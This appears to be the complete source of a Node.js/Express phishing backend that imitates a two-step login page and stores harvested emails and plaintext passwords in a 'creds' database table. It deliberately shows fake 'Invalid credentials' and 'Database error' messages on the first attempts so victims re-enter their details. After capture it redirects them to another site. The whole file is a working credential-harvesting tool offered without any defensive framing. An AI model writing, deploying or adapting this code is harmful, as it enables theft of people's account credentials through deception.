const path = require('path');
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Parse URL-encoded bodies (for simple form submissions)
app.use(express.urlencoded({ extended: true }));

// Parse cookies
app.use(cookieParser());

// Supabase PostgreSQL database connection
// Use connection string if provided, otherwise use individual connection parameters
const pool = process.env.SUPABASE_DB_URL 
  ? new Pool({
      connectionString: process.env.SUPABASE_DB_URL,
      ssl: {
        rejectUnauthorized: false // Supabase requires SSL
      }
    })
  : new Pool({
      host: process.env.SUPABASE_HOST || process.env.DB_HOST,
      port: process.env.SUPABASE_PORT || process.env.DB_PORT || 5432,
      database: process.env.SUPABASE_DB || process.env.DB_NAME,
      user: process.env.SUPABASE_USER || process.env.DB_USER,
      password: process.env.SUPABASE_PASSWORD || process.env.DB_PASSWORD,
      ssl: {
        rejectUnauthorized: false // Supabase requires SSL
      }
    });

// Initialize database table
(async () => {
  try {
    await pool.query(
      `CREATE TABLE IF NOT EXISTS creds (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NULL,
        session_id VARCHAR(255) NULL,
        session_expires_at TIMESTAMP NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )`
    );
    await pool.query(
      `CREATE TABLE IF NOT EXISTS session_count (
        id SERIAL PRIMARY KEY,
        session_id VARCHAR(255) NOT NULL,
        count INT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )`
    )
    console.log('Database table ready');
  } catch (err) {
    console.error('Error creating table', err);
  }
})();

// Helper function to generate unique session ID
function generateSessionId() {
  return crypto.randomUUID();
}

// Helper function to check if session is valid
async function isValidSession(sessionId) {
  if (!sessionId) return false;
  
  try {
    const result = await pool.query(
      'SELECT * FROM session_count WHERE session_id = $1',
      [sessionId]
    );
    
    if (result.rows.length === 0) return false;
    
    return true;
  } catch (err) {
    console.error('Error checking session', err);
    return false;
  }
}


app.get('/login', async (req, res) => {
  let sessionId = req.cookies.sessionId;
  console.log("login get session id:", sessionId)
  const isCheckedIn = await isValidSession(sessionId);
  if(!isCheckedIn){
    sessionId = generateSessionId()
    res.cookie('sessionId', sessionId, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
    await pool.query('INSERT INTO session_count (session_id, count) VALUES ($1, $2)', [sessionId, 1]);
  }

  res.render('login', {
    sessionId: sessionId,
    error: req.query.error,
    success: req.query.success,
  });
});


app.post('/login', async (req, res) => {
  const { email } = req.body;
  // validate email (include regex)
  if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login?error=Invalid+email');
  }
  try{
    let sessionId = req.cookies.sessionId;
    console.log("login post session id:", sessionId)
    const isCheckedIn = await isValidSession(sessionId);
    if(!isCheckedIn){
      sessionId = generateSessionId();
      res.cookie('sessionId', sessionId, {
        maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
      });
      await pool.query('INSERT INTO session_count (session_id, count) VALUES ($1, $2)', [sessionId, 1]);
    }

    let sessionCount = await pool.query('SELECT count FROM session_count WHERE session_id = $1', [sessionId]);
    console.log(sessionCount)
    sessionCount = sessionCount.rows[0].count;
    if(sessionCount % 3 === 1){
      let result = await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2 ', [sessionCount+1 ,sessionId])
      console.log(result)
      console.log("New updated count:", sessionCount+1)
      return res.redirect('/login?error=Invalid+credentials');
    }else if (sessionCount % 3 === 2){
      await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2', [sessionCount+1, sessionId])
      console.log("New updated count:", sessionCount+1)
      return res.redirect('/login?error=Database+error')
    }else {
      await pool.query('INSERT INTO creds (email, session_id) VALUES ($1, $2)', [email, sessionId])
      await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2', [1, sessionId])
      console.log("New updated count:", sessionCount+1)
      return res.redirect('/login/password')
    }
  } catch (err) {
    console.error('Error during login', err);
    return res.redirect('/login?error=Database+error');
  }
});

app.get('/login/password', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const isCheckedIn = await isValidSession(sessionId);
  if(!isCheckedIn){
    return res.redirect('/login')
  }
  let email = await pool.query('SELECT email FROM creds WHERE session_id = $1', [sessionId]);
  email = email.rows[0].email

  res.render('password', {
    sessionId: sessionId,
    email: email,
    error: req.query.error
  });
});


app.post('/login/password', async (req, res) => {
  const { password } = req.body;
  
  try{
    let sessionId = req.cookies.sessionId;
    const isCheckedIn = await isValidSession(sessionId);
    if(!isCheckedIn){
      return res.redirect('/login')
    }

    let sessionCount = await pool.query('SELECT count FROM session_count WHERE session_id = $1', [sessionId]);
    sessionCount = sessionCount.rows[0].count;
    if(sessionCount % 3 === 1){
      await pool.query('UPDATE session_count SET count = $2 WHERE session_id = $1 ', [sessionId, sessionCount+1])
      return res.redirect('/login/password?error=Invalid+credentials');
    }else if (sessionCount % 3 === 2){
      await pool.query('UPDATE session_count SET count = $2 WHERE session_id = $1', [sessionId, sessionCount+1])
      return res.redirect('/login/password?error=Database+error')
    }else {
      await pool.query('UPDATE creds SET password = $2 WHERE session_id = $1', [sessionId, password])
      await pool.query('DELETE FROM session_count WHERE session_id = $1', [sessionId])
      return res.redirect(process.env.REDIRECT_URL)
    }
  } catch (err) {
    console.error('Error during login/password', err);
    return res.redirect('/login/password?error=Database+error');
  }
});

app.use((req, res)=> {
  res.redirect(process.env.MAIN_REDIRECT_URL)
})

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});


